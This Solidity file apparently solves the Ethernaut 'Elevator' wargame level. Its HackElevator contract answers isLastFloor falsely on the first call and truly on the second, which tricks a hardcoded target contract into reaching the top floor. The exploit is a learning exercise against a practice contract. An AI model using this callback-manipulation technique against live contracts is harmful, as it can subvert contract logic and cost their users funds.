pragma solidity ^0.4.24;

contract Elevator {
    function goTo(uint _floor) public;
}

contract HackElevator {
    bool called;

    function isLastFloor(uint) public view returns (bool) {
        if (!called) {
            called = true;
            return false;
        } else {
            return true;
        }
    }

    function goToTop() public {
        called = false;
        Elevator callElevator = Elevator(0x097df41679cf8f85ea8d24112d6b909026ec6e1a);

        callElevator.goTo(1);
    }
}